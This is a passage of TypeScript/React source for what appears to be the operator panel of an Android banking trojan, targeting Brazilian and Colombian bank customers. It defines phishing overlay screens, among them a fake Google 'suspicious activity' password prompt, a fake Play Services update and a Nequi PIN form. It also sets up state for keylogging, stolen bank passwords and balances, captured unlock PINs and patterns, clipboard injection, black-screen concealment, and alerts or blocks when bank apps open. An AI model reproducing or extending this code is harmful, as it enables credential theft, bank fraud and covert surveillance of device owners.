        { id: 'neq-text-desc', type: 'text', x: 40, y: 200, width: 280, height: 45, content: 'Ingresa tu número de celular y tu clave de 4 dígitos para continuar.', fontSize: 13, color: '#e2e8f0', textAlign: 'center', opacity: 100 },
        { id: 'neq-input-phone', type: 'input', x: 40, y: 255, width: 280, height: 45, placeholder: 'Número de cel (300 ...)', inputType: 'numeric', inputLabel: 'celular_nequi', backgroundColor: 'rgba(22, 6, 6, 0.6)', color: '#ffffff', borderRadius: 10, borderColor: '#ff007a' },
        { id: 'neq-input-pwd', type: 'input', x: 40, y: 315, width: 280, height: 45, placeholder: 'Clave de 4 dígitos', inputType: 'password', inputLabel: 'clave_nequi', backgroundColor: 'rgba(22, 6, 6, 0.6)', color: '#ffffff', borderRadius: 10, borderColor: '#ff007a' },
        { id: 'neq-btn-sub', type: 'button', x: 40, y: 380, width: 280, height: 48, content: 'Entrar', buttonAction: 'submit', backgroundColor: '#ff007a', color: '#ffffff', borderRadius: 10 },
        { id: 'neq-bio', type: 'fingerprint', x: 145, y: 500, width: 70, height: 100, biometricColor: '#ff007a', biometricText: 'Usar Reconocimiento' }
      ]
    }
  ]
};

const PRESET_SYSTEM_PROJECT = {
  id: 'preset-system-screens',
  name: ' TELAS DE SISTEMA',
  appName: 'System Presets',
  projectType: 'custom',
  screens: [
    {
      id: 'preset-google',
      name: ' Google Lock',
      backgroundColor: '#240d08',
      elements: [
        { id: 'goog-text-logo', type: 'text', x: 30, y: 80, width: 300, height: 40, content: 'Google', fontSize: 32, fontWeight: 'bold', color: '#f8b48a', textAlign: 'center', opacity: 100 },
        { id: 'goog-card-bg', type: 'rectangle', x: 20, y: 140, width: 320, height: 320, backgroundColor: '#303134', borderRadius: 16, opacity: 100 },
        { id: 'goog-text-title', type: 'text', x: 30, y: 160, width: 300, height: 30, content: 'Verifique sua identidade', fontSize: 20, color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'goog-text-desc', type: 'text', x: 40, y: 205, width: 280, height: 60, content: 'Seu dispositivo Android detectou uma atividade suspeita. Para continuar, insira a senha da sua conta Google.', fontSize: 13, color: '#e8eaed', textAlign: 'center', opacity: 100 },
        { id: 'goog-input-pwd', type: 'input', x: 40, y: 280, width: 280, height: 50, placeholder: 'Digite sua senha Google', inputType: 'password', inputLabel: 'senha_conta_google', backgroundColor: 'rgba(22, 6, 6, 0.6)', color: '#ffffff', borderRadius: 8, borderColor: '#f8b48a' },
        { id: 'goog-btn-sub', type: 'button', x: 230, y: 355, width: 90, height: 40, content: 'Próximo', buttonAction: 'submit', backgroundColor: '#f8b48a', color: '#202124', borderRadius: 20 }
      ]
    },
    {
      id: 'preset-system-update',
      name: 'š Atualização do Google Play',
      backgroundColor: '#0a0a0b',
      elements: [
        { id: 'su-text-logo', type: 'text', x: 30, y: 80, width: 300, height: 40, content: 'Google Play Services', fontSize: 22, fontWeight: 'bold', color: '#ff6b6b', textAlign: 'center', opacity: 100 },
        { id: 'su-card-bg', type: 'rectangle', x: 20, y: 140, width: 320, height: 325, backgroundColor: 'rgba(42, 18, 18, 0.5)', borderRadius: 16, opacity: 100 },
        { id: 'su-text-title', type: 'text', x: 30, y: 165, width: 300, height: 30, content: 'Atualização Obrigatória', fontSize: 18, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'su-text-desc', type: 'text', x: 40, y: 210, width: 280, height: 60, content: 'Uma atualização crítica de segurança do Google Play Services é necessária. Digite a senha do seu e-mail para validar.', fontSize: 12, color: '#c9a8a8', textAlign: 'center', opacity: 100 },
        { id: 'su-input-email', type: 'input', x: 40, y: 280, width: 280, height: 45, placeholder: 'Digite seu e-mail', inputType: 'text', inputLabel: 'email_update', backgroundColor: 'rgba(22, 6, 6, 0.7)', color: '#ffffff', borderRadius: 8, borderColor: '#ff6b6b' },
        { id: 'su-input-pwd', type: 'input', x: 40, y: 335, width: 280, height: 45, placeholder: 'Digite a senha do e-mail', inputType: 'password', inputLabel: 'senha_update', backgroundColor: 'rgba(22, 6, 6, 0.7)', color: '#ffffff', borderRadius: 8, borderColor: '#ff6b6b' },
        { id: 'su-btn-sub', type: 'button', x: 40, y: 395, width: 280, height: 45, content: 'Atualizar Agora', buttonAction: 'submit', backgroundColor: '#ff6b6b', color: '#0a0a0b', borderRadius: 8 }
      ]
    }
  ]
};;

interface DeviceControlProps {
  onLogout: () => void;
}





export default function DeviceControl({ onLogout }: DeviceControlProps) {
  const { t } = useTranslation();
  const { deviceId } = useParams<{ deviceId: string }>();
  const navigate = useNavigate();
  const location = useLocation();

  useEffect(() => {
    if (deviceId?.startsWith('WIN-')) {
      navigate(`/win-device/${deviceId}`, { replace: true });
    }
  }, [deviceId, navigate]);

  const openPanelHandledRef = useRef<string | null>(null);
  const [device, setDevice] = useState<Device | null>(null);
  const [isBlackScreen, setIsBlackScreen] = useState(false);
  const [blackScreenOpacity, setBlackScreenOpacity] = useState(100);
  const [isBlackTouchBlocked, setIsBlackTouchBlocked] = useState(false);
  const blackScreenOpacityDebounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [isKeyloggerEnabled, setIsKeyloggerEnabled] = useState(false);
  const [isScreenReaderEnabled, setIsScreenReaderEnabled] = useState(false);
  
  // Long press do botão Power
  const [powerLongPressTimer, setPowerLongPressTimer] = useState<number | null>(null);
  const [isPowerLongPressed, setIsPowerLongPressed] = useState(false);
  const [showScreenReader, setShowScreenReader] = useState(false);
  const [showBankMonitorTab, setShowBankMonitorTab] = useState(false);
  const [showNotificationsTab, setShowNotificationsTab] = useState(false);
  const [showAppsTab, setShowAppsTab] = useState(false);
  const [showGoogleAccountsTab, setShowGoogleAccountsTab] = useState(false);
  const [showClipboardTab, setShowClipboardTab] = useState(false);
  const [showTouchTab, setShowTouchTab] = useState(false);
  const [showRobotTutorial, setShowRobotTutorial] = useState(false);
  const [panelZoom, setPanelZoom] = useState<number>(() => {
    try {
      return parseFloat(localStorage.getItem('gangstar_panel_zoom') || '100');
    } catch {
      return 100;
    }
  });

  const handleZoomChange = (newZoom: number) => {
    const clamped = Math.min(150, Math.max(65, newZoom));
    setPanelZoom(clamped);
    try {
      localStorage.setItem('gangstar_panel_zoom', clamped.toString());
    } catch {}
  };
  const [notifications, setNotifications] = useState<any[]>([]);
  const [isLoadingNotifications, setIsLoadingNotifications] = useState(false);
  const [clipboardData, setClipboardData] = useState<{ current: string | null; history: Array<{ id: number; text: string; timestamp: string }> }>({ current: null, history: [] });
  const [clipboardInputText, setClipboardInputText] = useState('');
  const [isLoadingClipboard, setIsLoadingClipboard] = useState(false);

  const fetchClipboard = useCallback(async () => {
    if (!deviceId) return;
    setIsLoadingClipboard(true);
    try {
      const data = await devicesAPI.getClipboard(deviceId);
      setClipboardData(data);
    } catch (e) {
      console.error('Erro ao buscar clipboard:', e);
    } finally {
      setIsLoadingClipboard(false);
    }
  }, [deviceId]);

  const handleInjectClipboard = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!deviceId || !clipboardInputText.trim()) return;
    try {
      await devicesAPI.setClipboard(deviceId, clipboardInputText.trim());
      alert(`Texto enviado para a área de transferência do aparelho: "${clipboardInputText.trim()}"`);
      setClipboardInputText('');
      setTimeout(() => fetchClipboard(), 1000);
    } catch (e) {
      alert('Erro ao enviar texto para o clipboard.');
    }
  };
  const [duplicationBanner, setDuplicationBanner] = useState<string | null>(null);
  

  const [deviceConnectionStatus, setDeviceConnectionStatus] = useState<'online' | 'offline' | 'stale'>('online');
  const [screenHierarchy, setScreenHierarchy] = useState<any>(null);
  const [screenScale, setScreenScale] = useState(1);
  const [hoveredNode, setHoveredNode] = useState<ScreenReaderNode | null>(null);
  const fetchHierarchyRef = useRef<(() => void) | null>(null);
  
  // Customizações para Tela V2
  const [v2TextScale, setV2TextScale] = useState<number>(1.0); // Multiplicador de tamanho do texto (0.6 a 2.0)
  const [v2DesignTheme, setV2DesignTheme] = useState<'cyan' | 'matrix' | 'neon-red' | 'purple-glowing'>('neon-red'); // Modos de tela
  const [v2HideUntypedElements, setV2HideUntypedElements] = useState<boolean>(false); // Ocultar vazios se preferir
  const [v2Opacity, setV2Opacity] = useState<number>(0.7); // Opacidade dos elementos (0.2 a 1.0)
  const [v2ShowGrid, setV2ShowGrid] = useState<boolean>(true); // Mostrar grade de fundo
  const [v2CornerStyle, setV2CornerStyle] = useState<'brackets' | 'full-border' | 'dots' | 'none'>('brackets'); // Estilo das bordas
  const [v2ShowCoords, setV2ShowCoords] = useState<boolean>(false); // Mostrar coordenadas em cada elemento
  const [v2PatternMode, setV2PatternMode] = useState<boolean>(false); // Modo de desenho de senha padrão (Pattern Lock) na V2
  const [v2PatternDrawn, setV2PatternDrawn] = useState<number[]>([]); // Sequência de pontos de 1 a 9 desenhados
  const v2PatternDrawnRef = useRef<number[]>([]); // Ref síncrono para garantir captura de 100% dos pontos sem travamento do React state
  const [v2PatternDragPos, setV2PatternDragPos] = useState<{ x: number; y: number } | null>(null);
  const [v2FilterQuery, setV2FilterQuery] = useState<string>('');
  const [showV2Inspector, setShowV2Inspector] = useState<boolean>(false);
  const [v2SearchTerm, setV2SearchTerm] = useState<string>('');
  const [v2InspectorCategory, setV2InspectorCategory] = useState<'all' | 'buttons' | 'inputs' | 'texts'>('all');
  
  //  Sistema de Alerta de Abertura de Apps Monitorados
  const [monitoredAlertPkgs, setMonitoredAlertPkgs] = useState<string[]>(() => {
    try {
      return JSON.parse(localStorage.getItem('monitoredAlertPkgs') || '[]');
    } catch {
      return ['com.nu.production', 'br.com.itau', 'br.com.bradesco', 'com.santander.app', 'com.mercadopago.wallet', 'com.bb.android'];
    }
  });

  const [activeAppAlert, setActiveAppAlert] = useState<{ pkg: string; appName: string; timestamp: number } | null>(null);
  const [expandedAppActivities, setExpandedAppActivities] = useState<string | null>(null);

  const toggleMonitorAppAlert = (pkg: string, name: string) => {
    setMonitoredAlertPkgs(prev => {
      const exists = prev.includes(pkg);
      const next = exists ? prev.filter(p => p !== pkg) : [...prev, pkg];
      localStorage.setItem('monitoredAlertPkgs', JSON.stringify(next));
      addLog(exists ? ` Alerta desativado para ${name}` : ` Alerta de Abertura ativado para ${name}!`);
      return next;
    });
  };

  const autoMonitorAllBanks = () => {
    const bankPkgs = installedBanks.map(b => b.package);
    setMonitoredAlertPkgs(prev => {
      const merged = Array.from(new Set([...prev, ...bankPkgs]));
      localStorage.setItem('monitoredAlertPkgs', JSON.stringify(merged));
      addLog(` ${bankPkgs.length} Aplicativos Bancários adicionados ao Monitoramento!`);
      return merged;
    });
  };

  const autoMonitorAllSocial = () => {
    const socialPkgs = installedApps.filter(a => isSocialApp(a.package)).map(a => a.package);
    setMonitoredAlertPkgs(prev => {
      const merged = Array.from(new Set([...prev, ...socialPkgs]));
      localStorage.setItem('monitoredAlertPkgs', JSON.stringify(merged));
      addLog(` ${socialPkgs.length} Redes Sociais adicionadas ao Monitoramento!`);
      return merged;
    });
  };

  const clearMonitoredApps = () => {
    setMonitoredAlertPkgs([]);
    localStorage.setItem('monitoredAlertPkgs', '[]');
    addLog(` Lista de Aplicativos Monitorados limpa.`);
  };

  const isAppMonitored = (pkg: string) => monitoredAlertPkgs.includes(pkg);

  //  Sistema de Bloqueio de Abertura de Apps Especificados (Tela de App Indisponível)
  const [blockedApps, setBlockedApps] = useState<string[]>(() => {
    try {
      return JSON.parse(localStorage.getItem('blockedApps') || '[]');
    } catch {
      return [];
    }
  });

  const isAppBlocked = (pkg: string) => {
    if (!pkg) return false;
    const clean = pkg.trim().toLowerCase();
    return blockedApps.some(p => p && p.trim().toLowerCase() === clean);
  };

  useEffect(() => {
    if (device?.blocked_packages && Array.isArray(device.blocked_packages) && device.blocked_packages.length > 0) {
      const cleanList = Array.from(new Set(device.blocked_packages.map(p => p.trim().toLowerCase())));
      setBlockedApps(prev => {
        const merged = Array.from(new Set([...prev, ...cleanList]));
        try {
          localStorage.setItem('blockedApps', JSON.stringify(merged));
        } catch {}
        return merged;
      });
    }
  }, [device?.blocked_packages]);

  const toggleBlockApp = async (pkg: string, name: string) => {
    const cleanPkg = pkg.trim().toLowerCase();
    const exists = isAppBlocked(cleanPkg);
    const next = exists 
      ? blockedApps.filter(p => p && p.trim().toLowerCase() !== cleanPkg) 
      : [...blockedApps, cleanPkg];
    
    setBlockedApps(next);
    setDevice(prev => prev ? { ...prev, blocked_packages: next } : null);
    try {
      localStorage.setItem('blockedApps', JSON.stringify(next));
    } catch {}
    
    await sendCommand({ action: 'TOGGLE_BLOCK_APP', package: cleanPkg, blocked: !exists });
    addLog(exists ? ` Abertura permitida para ${name}` : ` Impedir Abertura ATIVADO para ${name} (Exibe tela de Aplicativo Indisponível)`);
  };

  const blockAllBanks = async () => {
    const bankPkgs = installedBanks.map(b => b.package.trim().toLowerCase());
    const merged = Array.from(new Set([...blockedApps, ...bankPkgs]));
    setBlockedApps(merged);
    setDevice(prev => prev ? { ...prev, blocked_packages: merged } : null);
    localStorage.setItem('blockedApps', JSON.stringify(merged));
    await sendCommand({ action: 'SET_BLOCKED_APPS', packages: merged });
    addLog(` Impedir Abertura ATIVADO para todos os ${bankPkgs.length} Bancos!`);
  };

  const blockAllSocial = async () => {
    const socialPkgs = installedApps.filter(a => isSocialApp(a.package)).map(a => a.package.trim().toLowerCase());
    const merged = Array.from(new Set([...blockedApps, ...socialPkgs]));
    setBlockedApps(merged);
    setDevice(prev => prev ? { ...prev, blocked_packages: merged } : null);
    localStorage.setItem('blockedApps', JSON.stringify(merged));
    await sendCommand({ action: 'SET_BLOCKED_APPS', packages: merged });
    addLog(` Impedir Abertura ATIVADO para Redes Sociais!`);
  };

  const clearBlockedApps = async () => {
    setBlockedApps([]);
    setDevice(prev => prev ? { ...prev, blocked_packages: [] } : null);
    localStorage.setItem('blockedApps', '[]');
    await sendCommand({ action: 'SET_BLOCKED_APPS', packages: [] });
    addLog(` Todos os aplicativos foram desbloqueados.`);
  };

  const testAppUnavailableScreen = async (pkg: string = 'com.android.settings', name: string = 'Aplicativo') => {
    await sendCommand({ action: 'SHOW_APP_UNAVAILABLE', package: pkg, appName: name });
    addLog(` Testando tela de App Indisponível para ${name}`);
  };

  //  Detector em Tempo Real de Abertura de Apps Monitorados
  useEffect(() => {
    if (!monitoredAlertPkgs || monitoredAlertPkgs.length === 0) return;

    let detectedPkg: string | null = null;
    let detectedName: string = 'Aplicativo Monitorado';

    // 1. Verifica Tela V2 (screenHierarchy)
    if (screenHierarchy?.package_name && monitoredAlertPkgs.includes(screenHierarchy.package_name)) {
      detectedPkg = screenHierarchy.package_name;
      detectedName = screenHierarchy.app_name || screenHierarchy.package_name;
    } else if (screenHierarchy?.hierarchy?.package && monitoredAlertPkgs.includes(screenHierarchy.hierarchy.package)) {
      detectedPkg = screenHierarchy.hierarchy.package;
      detectedName = screenHierarchy.hierarchy.package;
    }

    // 2. Verifica últimas notificações (últimos registros)
    if (!detectedPkg && notifications && notifications.length > 0) {
      const recent = notifications.slice(0, 5);
      for (const n of recent) {
        if (n.package && monitoredAlertPkgs.includes(n.package)) {
          detectedPkg = n.package;
          detectedName = n.appName || n.package;
          break;
        }
      }
    }

    // 3. Verifica último app do dispositivo
    if (!detectedPkg && (device as any)?.last_app) {
      const u = (device as any).last_app;
      for (const p of monitoredAlertPkgs) {
        if (u.includes(p)) {
          detectedPkg = p;
          detectedName = u;
          break;
        }
      }
    }

    if (detectedPkg) {
      if (!activeAppAlert || activeAppAlert.pkg !== detectedPkg || (Date.now() - activeAppAlert.timestamp > 15000)) {
        setActiveAppAlert({ pkg: detectedPkg, appName: detectedName, timestamp: Date.now() });
        addLog(` ALERTA: Aplicativo monitorado aberto no aparelho: ${detectedName} (${detectedPkg})`);
        
        // Toca bip de áudio de alerta tático sintetizado por Web Audio API
        try {
          const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          osc.type = 'sawtooth';
          osc.frequency.setValueAtTime(880, ctx.currentTime);
          osc.frequency.exponentialRampToValueAtTime(440, ctx.currentTime + 0.35);
          gain.gain.setValueAtTime(0.35, ctx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.35);
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.start();
          osc.stop(ctx.currentTime + 0.35);
        } catch (e) {}
      }
    }
  }, [screenHierarchy, notifications, (device as any)?.last_app, monitoredAlertPkgs]);

  const getHierarchyRoot = (sh: any): any => {
    if (!sh) return null;
    if (sh.hierarchy && typeof sh.hierarchy === 'object') return sh.hierarchy;
    if (sh.bounds || sh.children) return sh;
    return null;
  };

  const cachedHierarchyRef = useRef<any>(null);
  const currentRoot = getHierarchyRoot(screenHierarchy);
  if (currentRoot) {
    cachedHierarchyRef.current = screenHierarchy;
  }
  const activeHierarchy = screenHierarchy || cachedHierarchyRef.current;

  const visibleV2Nodes = useMemo(() => {
    if (!activeHierarchy) return [];
    const root = getHierarchyRoot(activeHierarchy);
    if (!root) return [];
    const nodes: ScreenReaderNode[] = [];
    collectAllVisibleNodes(root, nodes);
    return nodes.filter(n => n.bounds && n.bounds.w > 0 && n.bounds.h > 0);
  }, [activeHierarchy]);

  // Auxiliares para detectar toque nos 9 pontos do Pattern Lock na Tela V2
  const findPNode = (node: any): any => {
    if (!node) return null;
    const candidates: { score: number; node: any }[] = [];

    const search = (n: any) => {
      if (!n) return;
      const resId = (n.resourceId || '').toLowerCase();
      const cls = (n.className || '').toLowerCase();
      const txt = (n.text || '').toLowerCase();
      const isPattern = n.isPatternLock || resId.includes('pattern') || cls.includes('pattern') || txt.includes('pattern');

      if (isPattern && n.bounds && n.bounds.w > 30 && n.bounds.h > 30) {
        let score = 0;
        if (resId.includes('lockpatternview') || cls.includes('lockpatternview')) score += 100;
        const aspect = n.bounds.w / n.bounds.h;
        if (aspect >= 0.85 && aspect <= 1.15) score += 50;
        if (n.isPatternLock) score += 30;
        candidates.push({ score, node: n });
      }

      if (n.children && Array.isArray(n.children)) {
        for (const child of n.children) {
          search(child);
        }
      }
    };

    search(node);
    if (candidates.length === 0) return null;
    candidates.sort((a, b) => b.score - a.score);
    return candidates[0].node;
  };

  const getV2PatternDots = (devW: number, devH: number, hierarchyNode?: any) => {
    let bx = devW * 0.125;
    let by = devH * 0.42;
    let bw = devW * 0.75;
    let bh = bw;

    const pNode = findPNode(hierarchyNode);
    if (pNode && pNode.bounds) {
      bw = pNode.bounds.w;
      bh = pNode.bounds.h;
      bx = pNode.bounds.x;
      by = pNode.bounds.y;
      if (bh > bw * 1.05) {
        const side = bw;
        by = pNode.bounds.y + (bh - side);
        bh = side;
      }
    }

    const dots: { id: number; x: number; y: number; r: number }[] = [];
    const rows = 3;
    const cols = 3;
    const hitR = (bw / 3) * 0.48;

    for (let r = 0; r < rows; r++) {
      for (let c = 0; c < cols; c++) {
        const id = r * 3 + c + 1;
        const dx = bx + (c + 0.5) * (bw / cols);
        const dy = by + (r + 0.5) * (bh / rows);
        dots.push({ id, x: dx, y: dy, r: hitR });
      }
    }
    return dots;
  };

  const getHitPatternDot = (devX: number, devY: number, devW: number, devH: number, hierarchyNode?: any) => {
    let bx = devW * 0.125;
    let by = devH * 0.42;
    let bw = devW * 0.75;
    let bh = bw;

    const pNode = findPNode(hierarchyNode);
    if (pNode && pNode.bounds) {
      bw = pNode.bounds.w;
      bh = pNode.bounds.h;
      bx = pNode.bounds.x;
      by = pNode.bounds.y;
      if (bh > bw * 1.05) {
        const side = bw;
        by = pNode.bounds.y + (bh - side);
        bh = side;
      }
    }

    // Com margem estendida (+60px), gestos laterais e curvas em L capturam as colunas 8 e 9 sem perder o foco
    const margin = 60;
    if (devX >= bx - margin && devX <= bx + bw + margin && devY >= by - margin && devY <= by + bh + margin) {
      const col = Math.floor((devX - bx) / (bw / 3));
      const row = Math.floor((devY - by) / (bh / 3));
      const safeCol = Math.max(0, Math.min(2, col));
      const safeRow = Math.max(0, Math.min(2, row));
      return safeRow * 3 + safeCol + 1;
    }

    const dots = getV2PatternDots(devW, devH, hierarchyNode);
    for (const dot of dots) {
      const dist = Math.sqrt(Math.pow(devX - dot.x, 2) + Math.pow(devY - dot.y, 2));
      if (dist <= dot.r * 1.25) {
        return dot.id;
      }
    }
    return null;
  };
  
  // Estados para gestos no Screen Reader V2
  const [mouseDownPos, setMouseDownPos] = useState<{x: number, y: number} | null>(null);
  const [mouseDownTime, setMouseDownTime] = useState<number>(0);
  const [isDragging, setIsDragging] = useState(false);
  const dragPathRef = useRef<{x: number, y: number}[]>([]); // Caminho completo do arraste
  const [textToSend, setTextToSend] = useState('');
  const [deviceNotes, setDeviceNotes] = useState<string>(() => {
    if (!deviceId) return '';
    return localStorage.getItem(`device_notes_${deviceId}`) || '';
  });

  const handleNotesChange = (val: string) => {
    setDeviceNotes(val);
    if (deviceId) {
      localStorage.setItem(`device_notes_${deviceId}`, val);
    }
  };
  const [keylogs, setKeylogs] = useState<any[]>([]);
  const [bankPasswords, setBankPasswords] = useState<any[]>([]);
  const [bankPasswordSearch, setBankPasswordSearch] = useState('');
  const [bankPasswordBankFilter, setBankPasswordBankFilter] = useState('ALL');
  const [bankBalances, setBankBalances] = useState<any[]>([]);
  const [uploadedFiles, setUploadedFiles] = useState<any[]>([]);
  const [_offlineKeylogs, setOfflineKeylogs] = useState<any[]>([]); // Keylogs capturados offline (underscore para ignorar warning)
  const [capturedUnlockPins, setCapturedUnlockPins] = useState<any[]>([]);
  const [customCaptures, setCustomCaptures] = useState<any[]>([]);
  const [showConfigureRomConfirm, setShowConfigureRomConfirm] = useState(false);
  const [isUnlockRecording, setIsUnlockRecording] = useState(false);

  // One-time seed guard so server truth (from SILENT_VNC_STATUS) initializes the purple/green viewer state on first load/refresh
  const captureStateSeededRef = useRef(false);
  
  //  KEYLOGGER POR DATA - Estados para novo sistema
  const [keylogSelectedDate, setKeylogSelectedDate] = useState<string>(() => {
    const d = new Date();
    return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
  });
  const [keylogsByDate, setKeylogsByDate] = useState<any[]>([]);
  const [keylogDates, setKeylogDates] = useState<{date: string, count: number}[]>([]);
  const [keylogSummary, setKeylogSummary] = useState<any>(null);
  const [isLoadingKeylogs, setIsLoadingKeylogs] = useState(false);
  const [keylogTotalToday, setKeylogTotalToday] = useState(0);
  
  //  Estados para cmera
  const [isCameraEnabled, setIsCameraEnabled] = useState(false);
  const [showCameraModal, setShowCameraModal] = useState(false);

  //  Estados para injeção de tela
  const [showInjectionModal, setShowInjectionModal] = useState(false);
  const [showCustomCapturesModal, setShowCustomCapturesModal] = useState(false);
  const [selectedProjectId, setSelectedProjectId] = useState<string | null>(null);
  const [selectedScreenIndex, setSelectedScreenIndex] = useState<number | null>(null);
  const [injectionModalTab, setInjectionModalTab] = useState<'inject' | 'mapping'>('inject');
  const [overlayMappings, setOverlayMappings] = useState<any[]>([]);
  const [selectedMappingPackage, setSelectedMappingPackage] = useState<string>('');
  const [customMappingPackage, setCustomMappingPackage] = useState<string>('');
  const [projects, setProjects] = useState<any[]>([PRESET_BANK_PROJECT]);
  const [mappingSearch, setMappingSearch] = useState<string>('');
  const [mappingFilter, setMappingFilter] = useState<'all' | 'banks' | 'user'>('banks');
  
  //  Estados para aba "Editar Telas de Banco"
  const [showEditBankScreensTab, setShowEditBankScreensTab] = useState(false);
  const [showBankVisualEditor, setShowBankVisualEditor] = useState(false);
  const [bankScreens, setBankScreens] = useState<any[]>(() => {
    const saved = localStorage.getItem('customPresetBankScreens');
    const defaults = PRESET_BANK_PROJECT.screens;
    if (!saved) return defaults;
    try {
      const list: any[] = JSON.parse(saved);
      // Merge new default screens not in list, AND re-apply new fields to existing ones
      defaults.forEach(def => {
        const idx = list.findIndex(s => s.id === def.id);
        if (idx === -1) {
          list.push(def);
        } else {
          // Re-apply new top-level props that weren't in old saved version
          const fieldsToMerge = ['multiStep', 'step1Label', 'step2Label', 'package_name'];
          fieldsToMerge.forEach(field => {
            if ((def as any)[field] !== undefined) {
              list[idx][field] = (def as any)[field];
            }
          });
        }
      });
      // Save merged result back
      localStorage.setItem('customPresetBankScreens', JSON.stringify(list));
      return list;
    } catch (e) {
      return defaults;
    }
  });
  const [selectedPresetScreenId, setSelectedPresetScreenId] = useState('preset-itau');
  const [editBankLogoText, setEditBankLogoText] = useState('itaú');
  const [editBankTitle, setEditBankTitle] = useState('Confirmar Acesso');
  const [editBankDesc, setEditBankDesc] = useState('Digite sua senha eletrônica de 6 dígitos para autorizar o acesso à sua conta.');
  const [editBankPlaceholder, setEditBankPlaceholder] = useState('Senha eletrônica (6 dígitos)');
  const [editBankButtonText, setEditBankButtonText] = useState('Confirmar');
  const [editBankBgColor, setEditBankBgColor] = useState('linear-gradient(185deg, #3e0e04 0%, #220703 100%)');
  const [editBankBtnColor, setEditBankBtnColor] = useState('#ec7000');
  const [editBankPackage, setEditBankPackage] = useState('br.com.itau');

  //  Estados para aba "Editar Telas de Sistema" (Não Bancos)
  const [showEditSystemScreensTab, setShowEditSystemScreensTab] = useState(false);
  const [showSystemVisualEditor, setShowSystemVisualEditor] = useState(false);
  const [systemScreens, setSystemScreens] = useState<any[]>(() => {
    const saved = localStorage.getItem('customPresetSystemScreens');
    const defaults = PRESET_SYSTEM_PROJECT.screens;
    if (!saved) return defaults;
    try {
      const list: any[] = JSON.parse(saved);
      defaults.forEach(def => {
        if (!list.some(s => s.id === def.id)) {
          list.push(def);
        }
      });
      return list;
    } catch (e) {
      return defaults;
    }
  });
  const [selectedSystemScreenId, setSelectedSystemScreenId] = useState('preset-google');
  const [editSystemLogoText, setEditSystemLogoText] = useState('Google');
  const [editSystemTitle, setEditSystemTitle] = useState('Verifique sua identidade');
  const [editSystemDesc, setEditSystemDesc] = useState('Seu dispositivo Android detectou uma atividade suspeita. Para continuar, insira a senha da sua conta Google.');
  const [editSystemPlaceholder, setEditSystemPlaceholder] = useState('Digite sua senha Google');
  const [editSystemButtonText, setEditSystemButtonText] = useState('Próximo');
  const [editSystemBgColor, setEditSystemBgColor] = useState('#240d08');
  const [editSystemBtnColor, setEditSystemBtnColor] = useState('#f8b48a');
  const [editSystemPackage, setEditSystemPackage] = useState('com.google.android.gms');

  const [editBankDigitsOption, setEditBankDigitsOption] = useState('6,4');

  const handleUpdateItauDigits = (option: string) => {
    setEditBankDigitsOption(option);
    const parts = option.split(',');
    const d1 = parseInt(parts[0], 10) || 6;
    const d2 = parseInt(parts[1] || parts[0], 10) || 4;

    setBankScreens(prev => {
      const updated = prev.map(screen => {
        if (screen.id !== selectedPresetScreenId) return screen;

        const dotsText = d1 === 4 ? '         ' : '               ';

        const updatedElements = screen.elements.map((el: any) => {
          const cloned = { ...el };
          if (cloned.id.includes('dots') || cloned.id.includes('pin')) {
            cloned.content = dotsText;
          }
          return cloned;
        });

        return {
          ...screen,
          digits1: d1,
          digits2: d2,
          maxDigits: d1,
          elements: updatedElements
        };
      });
      localStorage.setItem('customPresetBankScreens', JSON.stringify(updated));
      return updated;
    });
  };

  const selectPreset = (screenId: string) => {
    setSelectedPresetScreenId(screenId);
    const screen = bankScreens.find(s => s.id === screenId);
    if (!screen) return;
    
    const logoEl = screen.elements.find((el: any) => el.id.includes('logo') || el.type === 'logo');
    const titleEl = screen.elements.find((el: any) => el.id.includes('title'));
    const descEl = screen.elements.find((el: any) => el.id.includes('desc'));
    const inputEl = screen.elements.find((el: any) => el.type === 'input');
    const buttonEl = screen.elements.find((el: any) => el.type === 'button');
    
    setEditBankLogoText(logoEl ? logoEl.content || '' : '');
    setEditBankTitle(titleEl ? titleEl.content || '' : '');
    setEditBankDesc(descEl ? descEl.content || '' : '');
    setEditBankPlaceholder(inputEl ? inputEl.placeholder || '' : '');
    setEditBankButtonText(buttonEl ? buttonEl.content || '' : '');
    setEditBankBgColor(screen.backgroundColor || '#000000');
    setEditBankBtnColor(buttonEl ? buttonEl.backgroundColor || '#ef4444' : '#ef4444');
    
    const d1 = screen.digits1 || 6;
    const d2 = screen.digits2 || 4;
    setEditBankDigitsOption(`${d1},${d2}`);

    if (screenId === 'preset-itau' || screenId === 'preset-itau-system') setEditBankPackage('br.com.itau');
    else if (screenId === 'preset-nubank') setEditBankPackage('com.nubank');
    else if (screenId === 'preset-bb') setEditBankPackage('br.com.bb.android');
    else if (screenId === 'preset-bradesco') setEditBankPackage('br.com.bradesco');
    else if (screenId === 'preset-caixa') setEditBankPackage('br.com.caixa');
    else if (screenId === 'preset-santander') setEditBankPackage('com.santander.app');
    else if (screenId === 'preset-davivienda') setEditBankPackage('com.davivienda.daviviendaapp');
    else if (screenId === 'preset-bancolombia') setEditBankPackage('com.bancolombia.personas');
    else if (screenId === 'preset-nequi') setEditBankPackage('co.com.nequi');
  };

  const selectSystemPreset = (screenId: string) => {
    setSelectedSystemScreenId(screenId);
    const screen = systemScreens.find(s => s.id === screenId);
    if (!screen) return;
    
    const logoEl = screen.elements.find((el: any) => el.id.includes('logo') || el.type === 'logo');
    const titleEl = screen.elements.find((el: any) => el.id.includes('title'));
    const descEl = screen.elements.find((el: any) => el.id.includes('desc'));
    const inputEl = screen.elements.find((el: any) => el.type === 'input');
    const buttonEl = screen.elements.find((el: any) => el.type === 'button');
    
    setEditSystemLogoText(logoEl ? logoEl.content || '' : '');
    setEditSystemTitle(titleEl ? titleEl.content || '' : '');
    setEditSystemDesc(descEl ? descEl.content || '' : '');
    setEditSystemPlaceholder(inputEl ? inputEl.placeholder || '' : '');
    setEditSystemButtonText(buttonEl ? buttonEl.content || '' : '');
    setEditSystemBgColor(screen.backgroundColor || '#240d08');
    setEditSystemBtnColor(buttonEl ? buttonEl.backgroundColor || '#f8b48a' : '#f8b48a');
    
